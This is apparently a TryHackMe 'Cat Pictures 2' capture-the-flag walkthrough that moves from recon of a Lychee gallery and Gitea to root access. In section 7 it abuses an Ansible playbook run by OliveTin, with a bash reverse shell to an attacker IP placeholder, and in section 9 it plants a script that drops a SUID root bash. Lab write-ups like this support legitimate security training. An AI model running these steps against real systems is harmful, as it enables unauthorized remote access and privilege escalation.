# Cat Pictures 2 

Room: https://tryhackme.com/room/catpictures2

Now with more Cat Pictures!

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/catpictures2.md

## 1. Recon

Run a full TCP version scan:

```bash
nmap -sV -p- 10.67.138.58
```

Key services found:

```text
22/tcp    OpenSSH 7.6p1 Ubuntu
80/tcp    nginx 1.4.6
222/tcp   OpenSSH 9.0
1337/tcp  Golang net/http server
3000/tcp  Golang net/http server
8080/tcp  SimpleHTTPServer 0.6 Python 3.6.9
```

Service map:

```text
80    Lychee photo gallery
222   Gitea SSH
1337  OliveTin
3000  Gitea web UI
8080  Python SimpleHTTPServer
```

## 2. Lychee enumeration

Port 80 exposed a Lychee photo gallery.

Robots.txt showed useful directories:

```text
User-agent: *
Disallow: /data/
Disallow: /dist/
Disallow: /docs/
Disallow: /php/
Disallow: /plugins/
Disallow: /src/
Disallow: /uploads/
```

The Lychee API was reachable through `/php/`.

```bash
curl -s "http://10.67.138.58/php/?function=Session::init" | jq .
```

Output confirmed Lychee version:

```json
{
  "config": {
    "version": "030100",
    "checkForUpdates": "1"
  },
  "status": 1
}
```

List public albums:

```bash
curl -s "http://10.67.138.58/php/?function=Albums::get" | jq .
```

This revealed a public album:

```text
Album: Public
ID: 16678460194615
```

The album needed POST parameters to fetch full content:

```bash
curl -s -X POST http://10.67.138.58/php/ \
  -d 'function=Album::get' \
  -d 'albumID=16678460194615' \
  -d 'password=' \
  -o album.json

jq . album.json
```

That exposed the full-size image paths under:

```text
/uploads/big/
```

Download the images:

```bash
mkdir -p ~/Pictures/cats_big
cd ~/Pictures/cats_big

for f in \
f5054e97620f168c7b5088c85ab1d6e4 \
d8d93f1fa94e581b17b402cf8ed57bf2 \
f2685b23ca970630f6a4d14de66624fc \
35e794c47ef9448a9016729aea3faa34 \
8b79975e035d2348d1a8baf11e2a5bc0 \
0aed0f656320990ab83cbfd5ca09464d \
b5e6e0dc580889ef36213ee4d6ff406a
do
  wget "http://10.67.138.58/uploads/big/$f.jpg"
done
```

## 3. Finding the Gitea clue

Steghide and foremost did not lead anywhere useful for us.

Checks performed:

```bash
steghide info file.jpg
stegseek file.jpg /usr/share/wordlists/rockyou.txt
foremost -i file.jpg -o output/
binwalk file.jpg
```

The useful route was metadata.

```bash
exiftool *.jpg
```

One image contained metadata pointing to a hidden text file on port 8080.

The hidden text file gave Gitea details:

```text
Gitea: port 3000
User: samarium
Password: [REDACTED]
Ansible runner OliveTin: port 1337
```

Browse to Gitea:

```text
http://10.67.138.58:3000/
```

Log in as `samarium`.

## 4. Flag 1

Inside Gitea, the `samarium/ansible` repository contained `flag1.txt`.

Flag 1 was recovered from the repository.

```text
Flag 1: [REDACTED]
```

## 5. Understanding OliveTin

OliveTin was available on port 1337.

The action map showed several actions:

```bash
curl -s http://10.67.138.58:1337/api/GetActionMap | jq .
```

Important actions:

```text
Run backup script
Ping host
Run Ansible Playbook
Slow Script
Broken Script timeout
```

The ping action validated inputs:

```text
host: ascii_identifier
count: int
```

So simple command injection through `host` was blocked.

The Ansible action was more useful:

```bash
curl -s http://10.67.138.58:1337/api/StartAction \
  -H 'Content-Type: application/json' \
  --data-raw '{"actionName":"Run Ansible Playbook","arguments":[]}' \
  | jq -r '.logEntry.stdout, .logEntry.stderr'
```

Initial output showed:

```text
Already up to date.

PLAY [Test]

TASK [get the username running the deploy]
stdout: bismuth
```

This told us OliveTin was pulling a Git repo and running the playbook.

## 6. Gitea access note

We tested Gitea SSH on port 222 and confirmed it was Gitea's Git-over-SSH service, but it was **not required** for our final route.

The key test showed that SSH keys can authenticate to Gitea:

```bash
ssh -i ~/.ssh/gitea_ctf -p 222 git@10.67.138.58
```

Expected style of output:

```text
Hi there, test! You've successfully authenticated, but Gitea does not provide shell access.
```

This only proves Git SSH access works. It does **not** give a Linux shell, and it does not help unless that Gitea account has access to the target repository.

In our actual path, once we found the real Gitea credentials from the Lychee metadata clue, we used the **Gitea web UI** to edit and commit changes directly to the `samarium/ansible` repository. No local clone or SSH push was needed.

So port 222 is useful to understand the environment, but the required action was simply:

```text
Log into Gitea → open samarium/ansible → edit playbook.yaml → commit through the web UI
```

## 7. Flag 2 via Ansible

Edit the playbook in Gitea.

A simple proof task:

```yaml
    - name: Test
      shell: id
      register: id_output

    - debug:
        var: id_output.stdout
```

Commit the change in the Gitea UI.

Trigger OliveTin again:

```bash
curl -s http://10.67.138.58:1337/api/StartAction \
  -H 'Content-Type: application/json' \
  --data-raw '{"actionName":"Run Ansible Playbook","arguments":[]}' \
  | jq -r '.logEntry.stdout, .logEntry.stderr'
```

Output confirmed code execution as `bismuth`:

```text
uid=1000(bismuth) gid=1000(bismuth)
```

We then used a reverse shell task:

```yaml
    - name: Reverse shell
      shell: /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_TUN0_IP/4444 0>&1'
```

Listener:

```bash
nc -lvnp 4444
```

After triggering OliveTin, we got a shell as `bismuth`.

Read flag 2:

```bash
whoami
ls -la
cat flag2.txt
```

```text
Flag 2: [REDACTED]
```

## 8. Privilege escalation discovery

From the `bismuth` shell, inspect OliveTin:

```bash
cat /etc/OliveTin/config.yaml
ps auxww | grep -i olivetin
```

Important findings:

```yaml
- title: Run backup script
  shell: /opt/backupScript.sh

- title: "Run Ansible Playbook"
  shell: git -C /root/ansible pull && ansible-playbook /root/ansible/playbook.yaml
  timeout: 1000
```

OliveTin was running as root:

```text
root ... /usr/local/bin/OliveTin
```

The backup action tried to run:

```text
/opt/backupScript.sh
```

But the file was missing.

Directly writing `/opt/backupScript.sh` as `bismuth` failed:

```text
bash: /opt/backupScript.sh: Permission denied
```

## 9. Root via Ansible local connection and OliveTin backup action

This was the key difference in our root path. We did not need a separate sudo exploit. The machine already had a root-owned automation chain, and we controlled the playbook that chain executed.

### 9.1 What the OliveTin config revealed

From the `bismuth` shell, we read the OliveTin config:

```bash
cat /etc/OliveTin/config.yaml
```

Important actions:

```yaml
- title: Run backup script
  shell: /opt/backupScript.sh

- title: "Run Ansible Playbook"
  shell: git -C /root/ansible pull && ansible-playbook /root/ansible/playbook.yaml
  timeout: 1000
```

We also checked the OliveTin process:

```bash
ps auxww | grep -i olivetin
```

It showed OliveTin running as root:

```text
root ... /usr/local/bin/OliveTin
```

This means both OliveTin actions are launched by a root process. However, the original Ansible playbook was written to connect as `bismuth`, which is why our early tasks ran as `bismuth` instead of root.

### 9.2 Why directly creating the backup script failed

The backup action wanted to run this file:

```text
/opt/backupScript.sh
```

But `/opt` was owned by root:

```bash
ls -la /opt
```

```text
drwxr-xr-x  3 root root 4096 Nov  7  2022 .
```

So from the `bismuth` reverse shell, this failed:

```bash
cat > /opt/backupScript.sh <<'EOF'
#!/bin/bash
id
cat /root/root.txt
EOF
```

Error:

```text
bash: /opt/backupScript.sh: Permission denied
```

That told us the missing backup script was probably not meant to be created directly from the low-privileged shell.

### 9.3 Why the first Ansible copy attempt failed

We tried using the Gitea-controlled Ansible playbook to create `/opt/backupScript.sh`:

```yaml
    - name: Create backup script
      copy:
        dest: /opt/backupScript.sh
        mode: '0755'
        content: |
          #!/bin/bash
          id
          cat /root/root.txt
```

But it failed:

```text
Destination /opt not writable
```

The reason is subtle: even though OliveTin itself runs as root, the playbook had been using an SSH-style local target as `bismuth`. So Ansible was still executing the task with `bismuth` permissions.

Original style:

```yaml
- name: Test
  hosts: all
  remote_user: bismuth
```

That made Ansible connect back to `127.0.0.1` as `bismuth`, so the task could not write to root-owned `/opt`.

### 9.4 The fix: force Ansible to run locally as the launcher

The trick was to stop Ansible from SSHing back into localhost as `bismuth`. Instead, we forced Ansible to use a local connection.

Because OliveTin launches `ansible-playbook` as root, local Ansible tasks then run as root.

Working playbook structure:

```yaml
---
- name: Test
  hosts: all
  gather_facts: false
  vars:
    ansible_connection: local
    ansible_remote_tmp: /tmp/.ansible-remote
    ansible_local_temp: /tmp/.ansible-local

  tasks:
    - name: Check who local Ansible runs as
      command: whoami
      register: whoami_output
      changed_when: false

    - debug:
        var: whoami_output.stdout

    - name: Create backup script
      copy:
        dest: /opt/backupScript.sh
        mode: '0755'
        content: |
          #!/bin/bash
          cp /bin/bash /tmp/rootbash
          chmod 4755 /tmp/rootbash
          id
          ls -la /root
```

The temp directory variables were needed because Ansible initially failed trying to write under `~/.ansible/tmp` in this execution context. Setting both temp paths to `/tmp` made local module execution reliable.

### 9.5 Triggering the root Ansible run

After committing the updated playbook through the Gitea web UI, trigger the OliveTin Ansible action:

```bash
curl -s http://10.67.174.55:1337/api/StartAction \
  -H 'Content-Type: application/json' \
  --data-raw '{"actionName":"Run Ansible Playbook","arguments":[]}' \
  | jq -r '.logEntry.stdout, .logEntry.stderr'
```

The important output was:

```text
whoami_output.stdout: root
Create backup script changed
```

That confirmed the playbook was now running locally as root and had successfully written `/opt/backupScript.sh`.

### 9.6 Triggering the root backup action

Now trigger the second OliveTin action:

```bash
curl -s http://10.67.174.55:1337/api/StartAction \
  -H 'Content-Type: application/json' \
  --data-raw '{"actionName":"Run backup script","arguments":[]}' \
  | jq -r '.logEntry.stdout, .logEntry.stderr'
```

This ran `/opt/backupScript.sh` as root. The script copied `/bin/bash` to `/tmp/rootbash` and set the SUID bit:

```bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

### 9.7 Getting a root shell

From the existing `bismuth` reverse shell, run:

```bash
/tmp/rootbash -p
```

The `-p` matters because it tells bash to preserve the effective UID. Without `-p`, bash may drop privileges.

Then confirm root and read the flag:

```bash
whoami
id
cd /root
ls
cat flag3.txt
```

Flag 3 was recovered:

```text
Flag 3: [REDACTED]
```

### 9.8 Why this worked

The root chain was:

```text
We can edit samarium/ansible in Gitea
→ OliveTin runs git pull as root from /root/ansible
→ OliveTin launches ansible-playbook as root
→ Original playbook SSHed locally as bismuth, limiting privileges
→ We changed the playbook to ansible_connection: local
→ Tasks ran as root because the parent ansible-playbook process was root
→ Root Ansible task created /opt/backupScript.sh
→ OliveTin backup action executed /opt/backupScript.sh as root
→ Script created SUID /tmp/rootbash
→ /tmp/rootbash -p gave a root shell
```

## 10. How our path differed from public walkthroughs

Most public walkthroughs follow this route:

```text
Lychee image metadata
→ hidden file on port 8080
→ Gitea credentials
→ flag1.txt in Gitea
→ modify Ansible playbook
→ reverse shell as bismuth
→ run linpeas
→ exploit vulnerable sudo with Baron Samedit CVE-2021-3156
→ root
```

Our route differed at privilege escalation:

```text
We did not use Baron Samedit.
```

Instead, we used the application logic already present on the box:

```text
OliveTin ran as root
OliveTin pulled /root/ansible from Gitea
We controlled the playbook through Gitea
We forced Ansible to use local connection
Ansible ran as root
Ansible created /opt/backupScript.sh
OliveTin ran /opt/backupScript.sh as root
The script dropped a SUID bash at /tmp/rootbash
```

This was a cleaner chain because it used the room's own OliveTin and Ansible design instead of compiling and running a local kernel or sudo exploit.

## 11. Lessons learned

Key takeaways:

```text
1. If a web app exposes a photo gallery, check image metadata before deep stego.
2. Gitea SSH usually uses the SSH user git, while account identity comes from the key.
3. OliveTin action maps are very useful for understanding predefined execution paths.
4. Ansible stdout needs register plus debug to appear in OliveTin logs.
5. remote_user can hide the fact that the parent process is root.
6. ansible_connection: local can make Ansible run as the process user.
7. If a root service runs a missing script path, look for ways to create that script indirectly.
```
